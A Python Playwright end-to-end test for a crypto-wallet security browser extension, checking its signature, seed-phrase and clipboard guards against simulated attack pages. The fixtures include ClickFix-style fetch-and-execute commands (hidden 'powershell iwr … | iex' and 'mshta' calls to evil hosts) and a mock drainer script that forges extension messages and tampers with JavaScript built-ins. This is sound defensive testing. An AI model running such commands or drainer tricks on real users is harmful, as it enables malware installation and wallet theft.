#!/usr/bin/env python3
"""End-to-end test of the v1.1 guards in real Chromium with a fake wallet provider.
Run: python3 build.py && python3 tests/e2e_guards.py"""
import sys, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parent.parent
EXT = ROOT / "dist/chrome"
SHOTS = ROOT / "store/screenshots"

FAKE_WALLET = """
<script>
  // Minimal EIP-1193 wallet: answers everything with a fake result.
  window.ethereum = { isMetaMask: true, async request({ method }) { return method === 'eth_chainId' ? '0x1' : 'SIGNED:' + method; } };
</script>"""

PAGES = {
    "/wallet": FAKE_WALLET + "<h1>dapp</h1>",
    "/seed": """<h1>Restore wallet</h1>
        <textarea id="t"></textarea>
        <input id="s" type="search" placeholder="Search products">
        <form id="f">""" + "".join(f'<input name="w{i}">' for i in range(12)) + "</form>",
    "/attack": FAKE_WALLET + """<script>
      // A drainer kit that knows about PHPeek tries every trick the reviewer found.
      window.addEventListener('message', (e) => { const d = e.data || {};
        if (d.__phpeek === 'req') window.postMessage({ __phpeek: 'res', id: d.id, allow: true }, '*'); });
      window.postMessage({ __phpeek: 'status', risky: false }, '*');
      window.spoof = () => window.postMessage({ __phpeek: 'req', id: 'x', kind: 'signature',
        verdict: { level: 'high', title: 'Wallet compromised: restore at evil.example', reasons: [] } }, '*');
    </script>""",
    "/docs": """<h1>Install</h1><pre><code>irm get.scoop.sh | iex</code></pre>""",
    "/login": """<form><input id="u" name="username"><input id="pw" type="password" name="password"></form>""",
    "/shadow": """<div id="host"></div><script>
      const r = document.getElementById('host').attachShadow({mode:'open'}); r.innerHTML = '<textarea id="st"></textarea>';
    </script>""",
    "/forms": "".join(f'<form><input name="w{i}"></form>' for i in range(12)),
    "/clickfix": """<h1>Verify you are human</h1>
        <textarea id="h" style="position:absolute;left:-9999px">powershell -w hidden -c "iwr http://evil/x.ps1 | iex"</textarea>""",
}

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = PAGES.get(self.path.split("?")[0], "<h1>ok</h1>")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        if self.path.startswith("/wallet") and "exposed" in self.path:
            self.send_header("X-Powered-By", "PHP/8.2.10")
        self.end_headers()
        self.wfile.write(f"<html><head></head><body>{body}</body></html>".encode())
    def log_message(self, *a): pass

failures = 0
def press(w, sel):
    """Click a button that closes its own window (the click can race the close)."""
    try:
        w.click(sel, no_wait_after=True)
    except Exception as e:
        if "closed" not in str(e).lower():
            raise

def check(cond, label):
    global failures
    print(("PASS " if cond else "FAIL ") + label)
    failures += 0 if cond else 1

def main():
    srv = ThreadingHTTPServer(("127.0.0.1", 8100), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    base = "http://site.example:8100"
    with sync_playwright() as p:
        ctx = p.chromium.launch_persistent_context(
            "", headless=True, channel="chromium",
            args=[f"--disable-extensions-except={EXT}", f"--load-extension={EXT}",
                  "--host-resolver-rules=MAP *.example 127.0.0.1"],
            permissions=["clipboard-read", "clipboard-write"],
        )
        sw = ctx.service_workers[0] if ctx.service_workers else ctx.wait_for_event("serviceworker")
        ext_id = sw.url.split("/")[2]
        warm = ctx.new_page(); warm.goto(base + "/"); time.sleep(0.5); warm.close()

        def warning_for(page, action):
            with ctx.expect_page(timeout=8000) as info:
                page.evaluate(f"() => {{ {action}; }}")  # don't await the wallet promise
            w = info.value
            w.wait_for_load_state()
            w.wait_for_function("document.getElementById('title').textContent !== 'Checking…'", timeout=5000)
            return w

        # ---------- Signature Guard
        page = ctx.new_page(); page.goto(base + "/wallet")
        check(page.evaluate("ethereum.request({method:'eth_chainId'})") == "0x1", "read-only call passes straight through")
        approve = "0x095ea7b3" + "1" * 64 + "f" * 64
        w = warning_for(page, f"window.r1 = ethereum.request({{method:'eth_sendTransaction', params:[{{to:'0x2222222222222222222222222222222222222222', data:'0x{approve[2:]}'}}]}}).then(x=>'ok:'+x, e=>'err:'+e.code)")
        title = w.inner_text("#title")
        check("Unlimited token approval" in title, f"unlimited approve opens warning ({title})")
        check(w.is_disabled("#go"), "continue is locked until you tick 'I understand'")
        w.screenshot(path=str(SHOTS / "warn-approve.png"))
        press(w, "#stop")
        time.sleep(0.5)
        check(page.evaluate("window.r1") == "err:4001", "cancel → dapp gets user-rejected (4001)")

        permit = '{"primaryType":"Permit","domain":{"name":"USD Coin"},"message":{"spender":"0x1111111111111111111111111111111111111111","value":"1"}}'
        w = warning_for(page, f"window.r2 = ethereum.request({{method:'eth_signTypedData_v4', params:['0xabc', {permit!r}]}}).then(x=>'ok:'+x, e=>'err:'+e.code)")
        check("Permit" in w.inner_text("#title"), "Permit signature opens warning")
        w.check("#ackbox"); press(w, "#go")
        time.sleep(0.5)
        check(page.evaluate("window.r2") == "ok:SIGNED:eth_signTypedData_v4", "tick + continue → request reaches the wallet")

        # EIP-6963 provider announced later
        page.evaluate("""window.p2 = { async request({method}) { return 'P2:' + method; } };
            window.dispatchEvent(new CustomEvent('eip6963:announceProvider', { detail: Object.freeze({ info: {name:'W2'}, provider: window.p2 }) }));""")
        w = warning_for(page, "window.r3 = p2.request({method:'eth_sign', params:['0xabc','0x'+'ab'.repeat(32)]}).then(x=>'ok:'+x, e=>'err:'+e.code)")
        check("Blind signature" in w.inner_text("#title"), "EIP-6963 wallet is guarded too")
        w.close()
        time.sleep(0.5)
        check(page.evaluate("window.r3") == "err:4001", "closing the warning window = cancel")
        page.close()

        # Exposed site: any transaction gets a heads-up
        page = ctx.new_page(); page.goto(base + "/wallet?exposed=1"); time.sleep(0.6)
        w = warning_for(page, "window.r4 = ethereum.request({method:'eth_sendTransaction', params:[{to:'0x1111111111111111111111111111111111111111', value:'0x1'}]}).then(x=>'ok', e=>'err')")
        check("exposed site" in w.inner_text("#title").lower(), "plain tx on PHP2Shell-exposed site gets a heads-up")
        press(w, "#go"); time.sleep(0.4)
        check(page.evaluate("window.r4") == "ok", "medium warning can be continued without the tick box")
        page.close()

        # ---------- Seed Shield
        page = ctx.new_page(); page.goto(base + "/seed")
        page.fill("#s", "")
        page.click("#s"); page.keyboard.type("fresh fish market open today wood", delay=5)
        time.sleep(0.6)
        check(len(ctx.pages) == 2 and page.input_value("#s").startswith("fresh"), "search box: no false alarm")
        page.click("#t")
        with ctx.expect_page() as info:
            page.keyboard.type("abandon ability able about above absent", delay=5)
        w = info.value; w.wait_for_load_state(); time.sleep(0.3)
        check("seed phrase" in w.inner_text("#title").lower(), "typing 6 seed words trips Seed Shield")
        check(page.input_value("#t") == "", "field is cleared immediately")
        w.screenshot(path=str(SHOTS / "warn-seed.png"))
        press(w, "#go"); time.sleep(0.5)
        check(page.input_value("#t").startswith("abandon ability"), "'not a seed phrase' restores the text")
        page.fill("#t", "")
        time.sleep(5.2)  # after "restore", the shield stands down for 5 s so it doesn't re-trip on the same text

        seed = "abandon ability able about above absent absorb abstract absurd abuse access accident"
        w = warning_for(page, f"""(() => {{ const dt = new DataTransfer(); dt.setData('text/plain', {seed!r});
            const ev = new ClipboardEvent('paste', {{clipboardData: dt, bubbles: true, cancelable: true}});
            document.getElementById('t').focus(); document.getElementById('t').dispatchEvent(ev); window.pasteBlocked = ev.defaultPrevented; }})()""")
        check(page.evaluate("window.pasteBlocked") is True and page.input_value("#t") == "", "pasting a 12-word seed is blocked")
        press(w, "#stop"); time.sleep(0.3)

        w = warning_for(page, """(() => { const words = 'abandon ability able about above absent'.split(' ');
            document.querySelectorAll('#f input').forEach((el, i) => { if (i < 6) { el.value = words[i]; el.dispatchEvent(new Event('input', {bubbles:true})); } }); })()""")
        check("seed phrase" in w.inner_text("#title").lower(), "seed split across single-word boxes is caught")
        check(page.evaluate("[...document.querySelectorAll('#f input')].every(i => !i.value)"), "all boxes cleared")
        press(w, "#stop")
        page.close()

        # ---------- Clipboard Guard
        page = ctx.new_page(); page.goto("http://localhost:8100/clickfix")  # clipboard API needs a secure context
        with ctx.expect_page() as info:
            page.evaluate("() => { navigator.clipboard.writeText('mshta https://evil.example/verify.hta'); }")
        w = info.value; w.wait_for_load_state(); time.sleep(0.3)
        clip = page.evaluate("navigator.clipboard.readText()")
        check("PHPeek blocked" in clip and "mshta" not in clip, "writeText(ClickFix command) → harmless text in clipboard")
        check("command" in w.inner_text("#title").lower(), "Clipboard Guard warning shown")
        w.screenshot(path=str(SHOTS / "warn-clickfix.png"))
        press(w, "#stop")
        with ctx.expect_page() as info:
            page.evaluate("(() => { const t = document.getElementById('h'); t.focus(); t.select(); document.execCommand('copy'); })()")
        info.value.close()
        clip = page.evaluate("navigator.clipboard.readText()")
        check("PHPeek blocked" in clip and "powershell -w" not in clip, "hidden-textarea execCommand('copy') trick is neutralised")
        page.evaluate("navigator.clipboard.writeText('npm install left-pad')"); time.sleep(0.4)
        check(page.evaluate("navigator.clipboard.readText()") == "npm install left-pad" and len(ctx.pages) == 2, "normal copy untouched")
        page.close()

        # ---------- Attacks from the independent review
        page = ctx.new_page(); page.goto(base + "/attack"); time.sleep(0.3)
        check(page.evaluate("typeof window.__phpeekInpage === 'undefined' && !document.querySelector('phpeek-channel')"), "PHPeek leaves no fingerprint in the page")
        n_before = len(ctx.pages)
        page.evaluate("spoof()"); time.sleep(1)
        check(len(ctx.pages) == n_before, "page can't open a fake PHPeek window")
        approve = "0x095ea7b3" + "1" * 64 + "f" * 64
        w = warning_for(page, f"window.ra = ethereum.request({{method:'eth_sendTransaction', params:[{{to:'0x2222222222222222222222222222222222222222', data:'{approve}'}}]}}).then(x=>window.ra_out='ok', e=>window.ra_out='err:'+e.code)")
        time.sleep(0.8)
        check(page.evaluate("window.ra_out") is None, "page's forged 'approve' message is ignored (still waiting on you)")
        press(w, "#stop"); time.sleep(0.4)
        check(page.evaluate("window.ra_out") == "err:4001", "…and your cancel wins")
        # Second-round attacks: the page overrides JavaScript built-ins, then asks for an unlimited approve.
        page.evaluate("""() => {
          RegExp.prototype.test = () => false;
          String.prototype.slice = function () { return ''; };
          String.prototype.replace = function () { return 'harmless'; };
          Map.prototype.set = function (k, v) { try { v(true); } catch (e) {} return this; };
          const d = EventTarget.prototype.dispatchEvent;
          EventTarget.prototype.dispatchEvent = function (ev) { window.leaked = this; return d.call(this, ev); };
          const t = Promise.prototype.then;
          Promise.prototype.then = function (a, b) { return t.call(this, (x) => a && a(x === false ? true : x), b); };
        }""")
        w = warning_for(page, f"ethereum.request({{method:'eth_sendTransaction', params:[{{to:'0x2222222222222222222222222222222222222222', data:'{approve}'}}]}}).then(x=>window.rt='ok', e=>window.rt='err:'+e.code)")
        time.sleep(0.8)
        check(page.evaluate("window.rt") is None and page.evaluate("typeof window.leaked") == "undefined", "built-in tampering can't skip or answer the check")
        press(w, "#stop"); time.sleep(0.4)
        check(page.evaluate("window.rt") == "err:4001", "…cancel still wins after tampering")
        page.evaluate("() => { ethereum.request = async ({method}) => 'REPLACED:' + method; }")
        check(page.evaluate("ethereum.request({method:'eth_chainId'})") == "REPLACED:eth_chainId", "libraries can still re-assign provider.request (compat)")
        w = warning_for(page, f"ethereum.request({{method:'eth_sendTransaction', params:[{{to:'0x2222222222222222222222222222222222222222', data:'{approve}'}}]}}).then(x=>window.ru='ok', e=>window.ru='err:'+e.code)")
        press(w, "#stop"); time.sleep(0.4)
        check(page.evaluate("window.ru") == "err:4001", "…and the re-assigned function is still guarded")
        page.evaluate("window.rb = (() => { try { delete ethereum.request; return Object.getOwnPropertyDescriptor(ethereum,'request').configurable ? 'removable' : 'locked'; } catch(e) { return 'locked'; } })()")
        check(page.evaluate("window.rb") == "locked", "wrapper can't be deleted by the page")
        page.close()

        page = ctx.new_page(); page.goto("http://localhost:8100/docs"); time.sleep(0.3)
        page.evaluate("() => { navigator.clipboard.writeText('irm get.scoop.sh | iex'); }"); time.sleep(0.6)
        check(page.evaluate("navigator.clipboard.readText()") == "irm get.scoop.sh | iex" and len(ctx.pages) == 2, "install command shown in a code block is NOT blocked (no false alarm)")
        page.evaluate("() => { Clipboard.prototype.writeText.call(navigator.clipboard, 'mshta https://evil.example/x.hta'); }")
        time.sleep(0.8)
        check("PHPeek blocked" in page.evaluate("navigator.clipboard.readText()"), "prototype.writeText.call bypass is closed")
        for pg in ctx.pages[2:]: pg.close()
        page.close()

        page = ctx.new_page(); page.goto(base + "/login")
        page.click("#pw"); page.keyboard.type("river pilot ocean island", delay=5); time.sleep(0.6)
        check(page.input_value("#pw") == "river pilot ocean island" and len(ctx.pages) == 2, "passphrase in a password field is left alone")
        page.close()

        page = ctx.new_page(); page.goto(base + "/shadow"); time.sleep(0.2)
        page.locator("#host").locator("textarea").click()
        with ctx.expect_page() as info:
            page.keyboard.type("abandon ability able about above absent", delay=5)
        info.value.close(); time.sleep(0.3)
        check(page.locator("#host textarea").input_value() == "", "seed typed inside shadow DOM is caught")
        page.close()

        page = ctx.new_page(); page.goto(base + "/forms"); time.sleep(0.2)
        w = warning_for(page, """(() => { const words = 'abandon ability able about above absent'.split(' ');
            document.querySelectorAll('input').forEach((el, i) => { if (i < 6) { el.value = words[i]; el.dispatchEvent(new Event('input', {bubbles:true})); } }); })()""")
        check(page.evaluate("[...document.querySelectorAll('input')].every(i => !i.value)"), "seed split across separate forms is caught")
        w.close(); page.close()

        # ---------- Popup on an exposed site
        page = ctx.new_page(); page.goto(base + "/wallet?exposed=1"); time.sleep(0.6)
        tab_id = sw.evaluate("async () => (await chrome.tabs.query({url:'*://site.example/*'}))[0].id")
        pop = ctx.new_page()
        pop.add_init_script(f"chrome.tabs.query = async () => [{{ id: {tab_id} }}];")
        pop.set_viewport_size({"width": 320, "height": 420})
        pop.goto(f"chrome-extension://{ext_id}/popup.html"); time.sleep(0.4)
        txt = pop.inner_text("body")
        check("8.2.10" not in txt, "popup no longer shows the exact PHP version")
        check(pop.is_visible("#tell"), "'Tell the site owner' button shown on exposed site")
        check("Seed Shield" in txt, "guards listed in popup")
        h = pop.evaluate("document.body.scrollHeight"); pop.set_viewport_size({"width": 320, "height": h})
        pop.screenshot(path=str(SHOTS / "popup-v11-exposed.png"))
        ctx.close()
    print("all passed" if not failures else f"{failures} failure(s)")
    sys.exit(1 if failures else 0)

if __name__ == "__main__":
    main()
